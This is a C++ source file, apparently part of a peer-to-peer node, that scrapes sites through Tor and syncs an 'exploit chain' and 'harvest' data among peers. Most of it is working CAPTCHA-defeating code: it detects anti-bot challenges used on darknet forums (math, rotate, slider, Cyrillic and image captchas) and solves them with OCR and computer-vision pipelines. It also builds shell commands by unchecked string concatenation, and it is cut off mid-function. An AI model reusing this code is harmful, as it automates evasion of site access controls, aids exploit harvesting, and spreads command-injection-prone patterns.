#include "ide/synapsed_engine.h"

#include <algorithm>
#include <array>
#include <chrono>
#include <regex>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iomanip>
#include <mutex>
#include <random>
#include <sstream>
#include <thread>
#include <unordered_map>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

#ifdef _WIN32
#define CLOSESOCK(fd) closesocket(fd)
#define POPEN _popen
#define PCLOSE _pclose
#else
#define CLOSESOCK(fd) close(fd)
#define POPEN popen
#define PCLOSE pclose
#endif

namespace synapse {
namespace ide {

namespace {

std::string generateNodeId() {
    static std::mt19937 gen(std::random_device{}());
    static const char chars[] = "0123456789abcdef";
    std::uniform_int_distribution<> dist(0, 15);
    std::string id;
    id.reserve(16);
    for (int i = 0; i < 16; ++i) id.push_back(chars[dist(gen)]);
    return id;
}

int64_t nowMillis() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
               std::chrono::system_clock::now().time_since_epoch()).count();
}

std::string execCmd(const std::string& cmd) {
    std::array<char, 4096> buf;
    std::string out;
    FILE* p = POPEN(cmd.c_str(), "r");
    if (!p) return "";
    while (fgets(buf.data(), buf.size(), p)) out += buf.data();
    PCLOSE(p);
    return out;
}

std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

std::string jsonEscape(const std::string& s) {
    std::string r;
    r.reserve(s.size());
    for (char c : s) {
        if (c == '"') r += "\\\"";
        else if (c == '\\') r += "\\\\";
        else if (c == '\n') r += "\\n";
        else if (c == '\r') continue;
        else if (c == '\t') r += "\\t";
        else r += c;
    }
    return r;
}

std::string extractDomain(const std::string& url) {
    size_t start = url.find("://");
    if (start == std::string::npos) start = 0;
    else start += 3;
    size_t end = url.find('/', start);
    if (end == std::string::npos) end = url.size();
    size_t portPos = url.find(':', start);
    if (portPos != std::string::npos && portPos < end) end = portPos;
    return url.substr(start, end - start);
}

static std::mutex torRateMtx;
static std::unordered_map<std::string, int64_t> torDomainLastRequest;
static constexpr int64_t TOR_RATE_LIMIT_MS = 2000;

bool torRateLimit(const std::string& domain) {
    std::lock_guard<std::mutex> lock(torRateMtx);
    int64_t now = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    auto it = torDomainLastRequest.find(domain);
    if (it != torDomainLastRequest.end()) {
        int64_t elapsed = now - it->second;
        if (elapsed < TOR_RATE_LIMIT_MS) {
            int64_t wait = TOR_RATE_LIMIT_MS - elapsed;
            std::this_thread::sleep_for(std::chrono::milliseconds(wait));
        }
    }
    torDomainLastRequest[domain] = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
    if (torDomainLastRequest.size() > 1024) {
        int64_t cutoff = torDomainLastRequest[domain] - 300000;
        for (auto i = torDomainLastRequest.begin(); i != torDomainLastRequest.end();) {
            if (i->second < cutoff) i = torDomainLastRequest.erase(i);
            else ++i;
        }
    }
    return true;
}

}

SynapsedEngine::SynapsedEngine() = default;

SynapsedEngine::~SynapsedEngine() { shutdown(); }

SynapsedEngine& SynapsedEngine::instance() {
    static SynapsedEngine eng;
    return eng;
}

int SynapsedEngine::init(const std::string& configPath) {
    std::lock_guard<std::mutex> lock(mtx_);
    if (initialized_) return -1;

    configPath_ = configPath;
    nodeId_ = generateNodeId();
    startTime_ = nowMillis();
    peerCount_ = 0;

    const char* home = std::getenv("HOME");
    dataDir_ = home ? std::string(home) + "/.synapsenet" : "/tmp/.synapsenet";

    generateTorrc();

    auto ti = queryTorControl();
    if (ti.connected) {
        connectionType_ = "tor";
        peerCount_ = ti.circuits > 0 ? ti.circuits : 1;
    } else {
        connectionType_ = "clearnet";
    }

    initialized_ = true;
    return 0;
}

void SynapsedEngine::shutdown() {
    stopNaan();
    std::lock_guard<std::mutex> lock(mtx_);
    if (!initialized_) return;
    initialized_ = false;
    subscribers_.clear();
    nodeId_.clear();
    peerCount_ = 0;
    connectionType_ = "disconnected";
    modelLoaded_ = false;
}

bool SynapsedEngine::isInitialized() const {
    std::lock_guard<std::mutex> lock(mtx_);
    return initialized_;
}

std::string SynapsedEngine::rpcCall(const std::string& method, const std::string& paramsJson) {
    std::lock_guard<std::mutex> lock(mtx_);
    if (!initialized_) return "{\"error\":\"not initialized\"}";

    if (method == "node.status") return getStatus();
    if (method == "node.peers") return "{\"peer_count\":" + std::to_string(peerCount_) + "}";
    if (method == "naan.status") return naanStatus();
    if (method == "naan.control") return naanControl(paramsJson);
    if (method == "model.load") return modelLoad(paramsJson);
    if (method == "model.status") return modelStatus();

    if (method == "wallet.info") {
        return "{\"address\":\"" + jsonEscape(walletAddress_) +
               "\",\"balance\":\"" + balance_ + "\"}";
    }

    if (method == "network.info") {
        auto ti = queryTorControl();
        std::ostringstream ss;
        ss << "{\"peers\":[],\"tor\":{\"bootstrap\":\"" << jsonEscape(ti.bootstrap)
           << "\",\"circuits\":" << ti.circuits
           << ",\"bridge_status\":\"none\"},\"discovery\":{\"dns_queries\":0,\"peer_exchange\":0}"
           << ",\"bandwidth\":{\"inbound_kbps\":0,\"outbound_kbps\":0}}";
        return ss.str();
    }

    if (method == "exploit.list") {
        int offset = 0, limit = 100;
        size_t offP = paramsJson.find("\"offset\"");
        if (offP != std::string::npos) {
            size_t colon = paramsJson.find(':', offP);
            if (colon != std::string::npos) offset = std::atoi(paramsJson.c_str() + colon + 1);
        }
        size_t limP = paramsJson.find("\"limit\"");
        if (limP != std::string::npos) {
            size_t colon = paramsJson.find(':', limP);
            if (colon != std::string::npos) limit = std::atoi(paramsJson.c_str() + colon + 1);
        }
        return exploitChainList(offset, limit);
    }
    if (method == "exploit.stats") return exploitChainStats();
    if (method == "exploit.sync") {
        syncExploitChainFromPeers();
        return "{\"ok\":true,\"count\":" + std::to_string(exploitChain_.size()) + "}";
    }
    if (method == "harvest.list") {
        int offset = 0, limit = 50;
        size_t offP = paramsJson.find("\"offset\"");
        if (offP != std::string::npos) {
            size_t colon = paramsJson.find(':', offP);
            if (colon != std::string::npos) offset = std::atoi(paramsJson.c_str() + colon + 1);
        }
        size_t limP = paramsJson.find("\"limit\"");
        if (limP != std::string::npos) {
            size_t colon = paramsJson.find(':', limP);
            if (colon != std::string::npos) limit = std::atoi(paramsJson.c_str() + colon + 1);
        }
        if (limit <= 0) limit = 50;
        if (limit > 200) limit = 200;
        return harvestList(offset, limit);
    }
    if (method == "harvest.get") {
        size_t q1 = paramsJson.find("\"sha256\"");
        if (q1 == std::string::npos) return "{\"error\":\"missing sha256\"}";
        size_t vs = paramsJson.find('"', q1 + 8);
        size_t ve = paramsJson.find('"', vs + 1);
        if (vs == std::string::npos || ve == std::string::npos) return "{\"error\":\"bad json\"}";
        return harvestGet(paramsJson.substr(vs + 1, ve - vs - 1));
    }

    (void)paramsJson;
    return "{\"error\":\"unknown method\",\"method\":\"" + method + "\"}";
}

int SynapsedEngine::subscribe(const std::string& eventType, EventCallback callback) {
    std::lock_guard<std::mutex> lock(mtx_);
    subscribers_[eventType].push_back(std::move(callback));
    return 0;
}

std::string SynapsedEngine::getStatus() const {
    if (!initialized_) return "{\"error\":\"not initialized\"}";

    int64_t uptime = nowMillis() - startTime_;
    std::ostringstream ss;
    ss << "{\"node_id\":\"" << nodeId_
       << "\",\"connection\":\"" << connectionType_
       << "\",\"peer_count\":" << peerCount_
       << ",\"balance\":\"" << balance_
       << "\",\"naan_state\":\"" << naanState_
       << "\",\"model_loaded\":" << (modelLoaded_ ? "true" : "false")
       << ",\"model_name\":\"" << jsonEscape(modelName_)
       << "\",\"uptime\":" << uptime
       << ",\"version\":\"0.1.0-V4\""
       << "}";
    return ss.str();
}

void SynapsedEngine::generateTorrc() const {
    std::string torDir = dataDir_ + "/tor";
    std::string dataPath = torDir + "/data";
    std::string rcPath = dataDir_ + "/torrc";

    std::string mkd = "mkdir -p " + dataPath;
    system(mkd.c_str());

    std::ofstream f(rcPath);
    if (!f) return;
    f << "SocksPort 9050\n"
      << "ControlPort 9051\n"
      << "CookieAuthentication 1\n"
      << "DataDirectory " << dataPath << "\n"
      << "Log notice file " << torDir << "/tor.log\n";
}

SynapsedEngine::TorInfo SynapsedEngine::queryTorControl() const {
    TorInfo info;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return info;

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9051);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    struct timeval tv{2, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        CLOSESOCK(fd);
        return info;
    }

    std::string cookiePath = dataDir_ + "/tor/data/control_auth_cookie";
    std::ifstream cf(cookiePath, std::ios::binary);
    if (!cf) {
        CLOSESOCK(fd);
        return info;
    }
    std::vector<uint8_t> cookie((std::istreambuf_iterator<char>(cf)),
                                 std::istreambuf_iterator<char>());
    cf.close();
    if (cookie.size() != 32) { CLOSESOCK(fd); return info; }

    std::string hex;
    hex.reserve(64);
    for (uint8_t b : cookie) {
        char tmp[3];
        snprintf(tmp, sizeof(tmp), "%02X", b);
        hex += tmp;
    }

    std::string authCmd = "AUTHENTICATE " + hex + "\r\n";
    send(fd, authCmd.c_str(), authCmd.size(), 0);

    char buf[4096];
    ssize_t n = recv(fd, buf, sizeof(buf) - 1, 0);
    if (n <= 0 || std::string(buf, n).find("250") == std::string::npos) {
        CLOSESOCK(fd);
        return info;
    }

    std::string getinfo = "GETINFO status/bootstrap-phase circuit-status version\r\n";
    send(fd, getinfo.c_str(), getinfo.size(), 0);

    std::string resp;
    while (true) {
        n = recv(fd, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        buf[n] = 0;
        resp += buf;
        if (resp.find("250 OK") != std::string::npos) break;
    }

    send(fd, "QUIT\r\n", 6, 0);
    CLOSESOCK(fd);

    info.connected = true;

    auto pos = resp.find("PROGRESS=");
    if (pos != std::string::npos) {
        size_t end = resp.find_first_of(" \r\n", pos + 9);
        info.bootstrap = resp.substr(pos + 9, end - pos - 9) + "%";
    }

    int circuits = 0;
    size_t searchPos = 0;
    while ((searchPos = resp.find("BUILT", searchPos)) != std::string::npos) {
        circuits++;
        searchPos += 5;
    }
    info.circuits = circuits;

    pos = resp.find("version=");
    if (pos != std::string::npos) {
        size_t end = resp.find_first_of(" \r\n", pos + 8);
        info.version = resp.substr(pos + 8, end - pos - 8);
    }

    return info;
}

bool SynapsedEngine::isUrlSafe(const std::string& url) const {
    for (char c : url) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == ':' || c == '/' ||
              c == '.' || c == '_' || c == '?' || c == '&' ||
              c == '=' || c == '%' || c == '+' || c == '#' || c == '-'))
            return false;
    }
    return !url.empty();
}

std::string SynapsedEngine::fetchViaTor(const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    torRateLimit(extractDomain(url));
    std::string ua = randomUserAgent();
    int timeout = 45;
    if (url.find("dread") != std::string::npos) timeout = 90;
    std::string cmd = "curl -s -k --max-time " + std::to_string(timeout) +
        " --socks5-hostname 127.0.0.1:9050 -L "
        "-H \"User-Agent: " + ua + "\" "
        "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

SynapsedEngine::CaptchaResult SynapsedEngine::detectCaptcha(const std::string& html) const {
    CaptchaResult r;

    if (html.find("captcha") == std::string::npos &&
        html.find("CAPTCHA") == std::string::npos &&
        html.find("Captcha") == std::string::npos) {
        return r;
    }
    r.detected = true;

    size_t mathPos = std::string::npos;
    for (const auto& pat : {"What is ", "Solve: ", "Calculate: ", "Enter the result of "}) {
        mathPos = html.find(pat);
        if (mathPos != std::string::npos) break;
    }
    if (mathPos == std::string::npos) {
        size_t inp = html.find("name=\"captcha");
        if (inp != std::string::npos) {
            size_t scan = inp;
            while (scan > 0 && scan > inp - 200) {
                scan--;
                if (html[scan] >= '0' && html[scan] <= '9') {
                    size_t exprStart = scan;
                    while (exprStart > 0 && (
                        (html[exprStart - 1] >= '0' && html[exprStart - 1] <= '9') ||
                        html[exprStart - 1] == '+' || html[exprStart - 1] == '-' ||
                        html[exprStart - 1] == '*' || html[exprStart - 1] == '/' ||
                        html[exprStart - 1] == ' ' || html[exprStart - 1] == 'x'))
                        exprStart--;
                    std::string candidate = trim(html.substr(exprStart, scan - exprStart + 1));
                    bool hasOp = false;
                    for (char c : candidate) {
                        if (c == '+' || c == '-' || c == '*' || c == '/' || c == 'x') hasOp = true;
                    }
                    if (hasOp && candidate.size() >= 3) {
                        r.type = "math";
                        r.answer = solveMathCaptcha(candidate);
                        r.solved = !r.answer.empty();
                        return r;
                    }
                    break;
                }
            }
        }
    }

    if (mathPos != std::string::npos) {
        size_t eqEnd = html.find_first_of("?=<\n\r", mathPos + 5);
        if (eqEnd == std::string::npos) eqEnd = mathPos + 30;
        std::string expr = trim(html.substr(mathPos, eqEnd - mathPos));
        for (const auto& pfx : {"What is ", "Solve: ", "Calculate: ", "Enter the result of "}) {
            if (expr.find(pfx) == 0) expr = expr.substr(strlen(pfx));
        }
        expr = trim(expr);
        if (expr.back() == '?' || expr.back() == '=') expr.pop_back();
        expr = trim(expr);
        r.type = "math";
        r.answer = solveMathCaptcha(expr);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("odd one out") != std::string::npos ||
        html.find("pick the odd") != std::string::npos ||
        html.find("which is different") != std::string::npos ||
        html.find("which one does not") != std::string::npos ||
        html.find("select the different") != std::string::npos) {
        r.type = "odd_one_out";
        r.answer = solveOddOneOut(html, "");
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("what time") != std::string::npos ||
        html.find("What time") != std::string::npos ||
        html.find("clock") != std::string::npos ||
        html.find("tell the time") != std::string::npos) {
        size_t cPos = html.find("clock");
        if (cPos == std::string::npos) cPos = html.find("time");
        size_t imgTag = html.find("<img", cPos > 200 ? cPos - 200 : 0);
        if (imgTag != std::string::npos) {
            size_t srcPos = html.find("src=\"", imgTag);
            if (srcPos != std::string::npos) {
                srcPos += 5;
                size_t srcEnd = html.find('"', srcPos);
                if (srcEnd != std::string::npos) {
                    r.type = "clock";
                    r.answer = solveClockCaptcha(html.substr(srcPos, srcEnd - srcPos));
                    r.solved = !r.answer.empty();
                    return r;
                }
            }
        }
    }

    if (html.find("missing") != std::string::npos &&
        (html.find("hieroglyph") != std::string::npos ||
         html.find("symbol") != std::string::npos ||
         html.find("character") != std::string::npos)) {
        r.type = "hieroglyph";
        r.answer = solveHieroglyphCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("decaptcha") != std::string::npos ||
        html.find("ddos_form") != std::string::npos) {
        if (html.find("rotate") != std::string::npos) {
            r.type = "rotate";
            r.answer = solveRotateCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("ancaptcha") != std::string::npos ||
        html.find("anCaptcha") != std::string::npos ||
        html.find("anC_") != std::string::npos) {
        if (html.find("rotate") != std::string::npos ||
            html.find("Rotate") != std::string::npos) {
            r.type = "rotate";
            r.answer = solveRotateCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        if (html.find("slider") != std::string::npos ||
            html.find("Slider") != std::string::npos ||
            html.find("slide") != std::string::npos) {
            r.type = "slider";
            r.answer = solveSliderCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        if (html.find("pair") != std::string::npos ||
            html.find("Pair") != std::string::npos ||
            html.find("match") != std::string::npos) {
            r.type = "pair";
            r.answer = solvePairCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("rotate") != std::string::npos &&
        html.find("captcha") != std::string::npos &&
        html.find("data-angle") != std::string::npos) {
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if ((html.find("slider") != std::string::npos || html.find("slide") != std::string::npos) &&
        html.find("captcha") != std::string::npos &&
        (html.find("puzzle") != std::string::npos || html.find("drag") != std::string::npos)) {
        r.type = "slider";
        r.answer = solveSliderCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("<select") != std::string::npos &&
        html.find("captcha") != std::string::npos) {
        r.type = "multi_step";
        r.answer = solveMultiStepCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    bool hasCyrillic = false;
    for (size_t i = 0; i + 1 < html.size(); i++) {
        unsigned char c1 = html[i], c2 = html[i + 1];
        if (c1 == 0xD0 && c2 >= 0x90 && c2 <= 0xBF) { hasCyrillic = true; break; }
        if (c1 == 0xD1 && c2 >= 0x80 && c2 <= 0x8F) { hasCyrillic = true; break; }
    }

    if (html.find("qa-captcha") != std::string::npos ||
        html.find("data-xf-init=\"qa-captcha\"") != std::string::npos) {
        size_t qaDiv = html.find("qa-captcha");
        size_t mathStart = html.find_first_of("0123456789", qaDiv);
        if (mathStart != std::string::npos && mathStart < qaDiv + 200) {
            size_t mathEnd = mathStart;
            while (mathEnd < html.size() && (std::isdigit(html[mathEnd]) ||
                   html[mathEnd] == '+' || html[mathEnd] == '-' ||
                   html[mathEnd] == '*' || html[mathEnd] == 'x' ||
                   html[mathEnd] == ' ')) mathEnd++;
            std::string expr = trim(html.substr(mathStart, mathEnd - mathStart));
            if (!expr.empty()) {
                r.type = "math";
                r.answer = solveMathCaptcha(expr);
                r.solved = !r.answer.empty();
                return r;
            }
        }
    }

    size_t imgPos = html.find("captcha");
    if (imgPos == std::string::npos) imgPos = html.find("CAPTCHA");
    if (imgPos != std::string::npos) {
        size_t imgTag = html.rfind("<img", imgPos);
        if (imgTag == std::string::npos || imgPos - imgTag > 500)
            imgTag = html.find("<img", imgPos);
        if (imgTag != std::string::npos) {
            size_t srcPos = html.find("src=\"", imgTag);
            if (srcPos != std::string::npos && srcPos < imgTag + 500) {
                srcPos += 5;
                size_t srcEnd = html.find('"', srcPos);
                if (srcEnd != std::string::npos) {
                    std::string imgUrl = html.substr(srcPos, srcEnd - srcPos);
                    if (hasCyrillic) {
                        r.type = "cyrillic_text";
                        r.answer = solveTextCaptchaCyrillic(imgUrl);
                    } else {
                        r.type = "text_image";
                        r.answer = solveTextCaptcha(imgUrl);
                    }
                    r.solved = !r.answer.empty();
                    return r;
                }
            }
        }
    }

    r.type = "unknown";
    return r;
}

std::string SynapsedEngine::solveMathCaptcha(const std::string& expr) const {
    std::string clean;
    for (char c : expr) {
        if (c == 'x' || c == 'X') clean += '*';
        else if ((c >= '0' && c <= '9') || c == '+' || c == '-' || c == '*' || c == '/' || c == ' ')
            clean += c;
    }
    clean = trim(clean);
    if (clean.empty()) return "";

    int result = 0;
    int current = 0;
    char lastOp = '+';
    bool hasNum = false;

    for (size_t i = 0; i <= clean.size(); i++) {
        char c = (i < clean.size()) ? clean[i] : '+';
        if (c >= '0' && c <= '9') {
            current = current * 10 + (c - '0');
            hasNum = true;
        } else if (c == '+' || c == '-' || c == '*' || c == '/') {
            if (!hasNum) continue;
            if (lastOp == '+') result += current;
            else if (lastOp == '-') result -= current;
            else if (lastOp == '*') result *= current;
            else if (lastOp == '/' && current != 0) result /= current;
            current = 0;
            hasNum = false;
            lastOp = c;
        }
    }

    return std::to_string(result);
}

std::string SynapsedEngine::solveTextCaptcha(const std::string& imgUrl) const {
    if (imgUrl.empty()) return "";

    std::string ts = std::to_string(nowMillis());
    std::string tmpImg = "" + dataDir_ + "/captcha_" + ts + ".png";
    std::string cleanImg = "" + dataDir_ + "/captcha_" + ts + "_clean.png";

    if (imgUrl.find("data:image") == 0) {
        size_t commaP = imgUrl.find(',');
        if (commaP == std::string::npos) return "";
        std::string b64 = imgUrl.substr(commaP + 1);
        for (char c : b64) {
            if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' || c == '\n' || c == '\r'))
                return "";
        }
        {
            std::ofstream b64f(tmpImg + ".b64", std::ios::binary);
            if (!b64f) return "";
            b64f.write(b64.c_str(), b64.size());
        }
        std::string decodeCmd = "base64 -d < " + tmpImg + ".b64 > " + tmpImg + " 2>/dev/null";
        system(decodeCmd.c_str());
        std::remove((tmpImg + ".b64").c_str());
    } else {
        if (imgUrl[0] == '/') return "";
        if (!isUrlSafe(imgUrl)) return "";
        std::string dlCmd = "curl -s --max-time 15 --socks5-hostname 127.0.0.1:9050 -L "
            "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
            "-o " + tmpImg + " \"" + imgUrl + "\" 2>/dev/null";
        system(dlCmd.c_str());
    }

    std::string cnnModel = dataDir_ + "/captcha_cnn_model.pt";
    {
        std::ifstream cnnCheck(cnnModel);
        if (cnnCheck.good()) {
            std::string cnnCmd = "python3 " + dataDir_ +
                "/../tools/captcha_cnn/infer.py --model " + cnnModel +
                " " + tmpImg + " 2>/dev/null";
            std::string cnnResult = trim(execCmd(cnnCmd));
            if (cnnResult.size() >= 3 && cnnResult.size() <= 8) {
                std::string cnnAnswer;
                for (char c : cnnResult)
                    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                        cnnAnswer += c;
                if (cnnAnswer.size() >= 3) {
                    std::remove(tmpImg.c_str());
                    return cnnAnswer;
                }
            }
        }
    }

    std::string mlScript =
        "python3 -c \""
        "import sys, os\\n"
        "img_path = '" + tmpImg + "'\\n"
        "clean_path = '" + cleanImg + "'\\n"
        "WL = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\\n"
        "results = []\\n"
        "try:\\n"
        "  import cv2, numpy as np\\n"
        "  img = cv2.imread(img_path)\\n"
        "  if img is None: print(''); sys.exit()\\n"
        "  gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\\n"
        "  h, w = gray.shape\\n"
        "  is_hard = (w >= 300 and h >= 80)\\n"
        "  # Strategy 1: Otsu threshold + resize\\n"
        "  sc = max(3, 600 // max(w, 1))\\n"
        "  big = cv2.resize(gray, (w*sc, h*sc), interpolation=cv2.INTER_LANCZOS4)\\n"
        "  blur = cv2.GaussianBlur(big, (3,3), 0)\\n"
        "  _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)\\n"
        "  cv2.imwrite(clean_path, th)\\n"
        "  # Strategy 2: color kmeans segmentation (for busy backgrounds)\\n"
        "  kmeans_paths = []\\n"
        "  if is_hard:\\n"
        "    Z = img.reshape((-1,3)).astype(np.float32)\\n"
        "    crit = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 10, 1.0)\\n"
        "    _, labels, centers = cv2.kmeans(Z, 5, None, crit, 5, cv2.KMEANS_RANDOM_CENTERS)\\n"
        "    centers = np.uint8(centers)\\n"
        "    bri = [np.mean(c) for c in centers]\\n"
        "    si = list(np.argsort(bri))\\n"
        "    for combo in [si[:1], si[:2], si[-1:], si[-2:]]:\\n"
        "      mask = np.zeros(labels.shape[0], dtype=np.uint8)\\n"
        "      for i in combo: mask[labels.flatten() == i] = 255\\n"
        "      mask = mask.reshape((h, w))\\n"
        "      inv = cv2.bitwise_not(mask)\\n"
        "      bp = clean_path.replace('.png', '_km' + str(combo[0]) + '.png')\\n"
        "      b2 = cv2.resize(inv, (800, 200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "      cv2.imwrite(bp, b2)\\n"
        "      kmeans_paths.append(bp)\\n"
        "    # Strategy 3: HSV color isolation\\n"
        "    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)\\n"
        "    green = cv2.inRange(hsv, np.array([35,40,40]), np.array([85,255,255]))\\n"
        "    white = cv2.inRange(hsv, np.array([0,0,180]), np.array([180,30,255]))\\n"
        "    dark = cv2.inRange(hsv, np.array([0,0,0]), np.array([180,255,80]))\\n"
        "    combined = green | white | dark\\n"
        "    b3 = cv2.resize(cv2.bitwise_not(combined), (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    hsvp = clean_path.replace('.png', '_hsv.png')\\n"
        "    cv2.imwrite(hsvp, b3)\\n"
        "    kmeans_paths.append(hsvp)\\n"
        "    lab = cv2.cvtColor(img, cv2.COLOR_BGR2LAB)\\n"
        "    a_ch = lab[:,:,1]; b_ch = lab[:,:,2]\\n"
        "    _, a_hi = cv2.threshold(a_ch, 140, 255, cv2.THRESH_BINARY)\\n"
        "    _, a_lo = cv2.threshold(a_ch, 110, 255, cv2.THRESH_BINARY_INV)\\n"
        "    _, b_hi = cv2.threshold(b_ch, 140, 255, cv2.THRESH_BINARY)\\n"
        "    _, b_lo = cv2.threshold(b_ch, 100, 255, cv2.THRESH_BINARY_INV)\\n"
        "    lab_mask = a_hi | a_lo | b_hi | b_lo\\n"
        "    lk = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3,3))\\n"
        "    lab_mask = cv2.morphologyEx(lab_mask, cv2.MORPH_CLOSE, lk)\\n"
        "    lab_big = cv2.resize(lab_mask, (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    labp = clean_path.replace('.png', '_lab.png')\\n"
        "    cv2.imwrite(labp, lab_big)\\n"
        "    kmeans_paths.append(labp)\\n"
        "    clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(4,4))\\n"
        "    cl = clahe.apply(gray)\\n"
        "    cl_big = cv2.resize(cl, (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    clp = clean_path.replace('.png', '_clahe.png')\\n"
        "    cv2.imwrite(clp, cl_big)\\n"
        "    kmeans_paths.append(clp)\\n"
        "except: pass\\n"
        "# EasyOCR on original\\n"
        "try:\\n"
        "  import easyocr\\n"
        "  reader = easyocr.Reader(['en'], gpu=False, verbose=False)\\n"
        "  r = reader.readtext(img_path, detail=1, allowlist=WL)\\n"
        "  for _, t, c in r:\\n"
        "    results.append((t, c, 'easy_orig'))\\n"
        "  # EasyOCR on kmeans variants\\n"
        "  for kp in kmeans_paths:\\n"
        "    if os.path.exists(kp):\\n"
        "      r2 = reader.readtext(kp, detail=1, allowlist=WL)\\n"
        "      for _, t2, c2 in r2:\\n"
        "        results.append((t2, c2, 'easy_' + kp))\\n"
        "except: pass\\n"
        "# Tesseract on Otsu\\n"
        "try:\\n"
        "  import subprocess\\n"
        "  for psm in ['7', '8', '6']:\\n"
        "    for target in [clean_path, img_path]:\\n"
        "      if not os.path.exists(target): continue\\n"
        "      r3 = subprocess.run(['tesseract', target, 'stdout', '--psm', psm,\\n"
        "        '-c', 'tessedit_char_whitelist=' + WL], capture_output=True, text=True, timeout=10)\\n"
        "      t = r3.stdout.strip()\\n"
        "      if len(t) >= 2: results.append((t, 0.5, 'tess_' + psm))\\n"
        "      if len(t) >= 3: break\\n"
        "except: pass\\n"
        "# TrOCR transformer (best for scene text)\\n"
        "try:\\n"
        "  from transformers import TrOCRProcessor, VisionEncoderDecoderModel\\n"
        "  from PIL import Image\\n"
        "  proc = TrOCRProcessor.from_pretrained('microsoft/trocr-small-printed')\\n"
        "  mdl = VisionEncoderDecoderModel.from_pretrained('microsoft/trocr-small-printed')\\n"
        "  pil = Image.open(img_path).convert('RGB')\\n"
        "  pv = proc(images=pil, return_tensors='pt').pixel_values\\n"
        "  ids = mdl.generate(pv)\\n"
        "  tt = proc.batch_decode(ids, skip_special_tokens=True)[0]\\n"
        "  if len(tt) >= 2: results.append((tt, 0.9, 'trocr'))\\n"
        "except: pass\\n"
        "# Pick best: high confidence wins, penalize noise\\n"
        "if not results: print('')\\n"
        "else:\\n"
        "  def score(x):\\n"
        "    t,c,_=x; n=len(t)\\n"
        "    if n<2: return 0\\n"
        "    len_pen = 1.0 if 3<=n<=6 else 0.6 if n<=8 else 0.3\\n"
        "    b_count = sum(1 for ch in t if ch in 'B8')\\n"
        "    b_pen = 1.0 if b_count <= 2 else 0.4 if b_count <= 3 else 0.1\\n"
        "    consec = 0; mx = 0\\n"
        "    for ch in t:\\n"
        "      if ch in 'B8': consec += 1; mx = max(mx, consec)\\n"
        "      else: consec = 0\\n"
        "    if mx >= 3: b_pen *= 0.1\\n"
        "    return c * len_pen * b_pen\\n"
        "  best = max(results, key=score)\\n"
        "  ans = ''.join(c for c in best[0] if c.isalnum())\\n"
        "  print(ans)\\n"
        "# Cleanup\\n"
        "import glob\\n"
        "for f in glob.glob(clean_path.replace('.png', '*.png')): os.remove(f)\\n"
        "\" 2>/dev/null";
    std::string mlResult = trim(execCmd(mlScript));

    std::remove(tmpImg.c_str());
    std::remove(cleanImg.c_str());

    std::string answer;
    for (char c : mlResult)
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
            answer += c;
    return answer;
}

std::string SynapsedEngine::submitCaptchaAndRefetch(const std::string& url,
    const std::string& formAction, const std::string& field,
    const std::string& answer) const {
    if (!isUrlSafe(url) || answer.empty()) return "";

    std::string postUrl = formAction.empty() ? url : formAction;
    if (!isUrlSafe(postUrl)) return "";

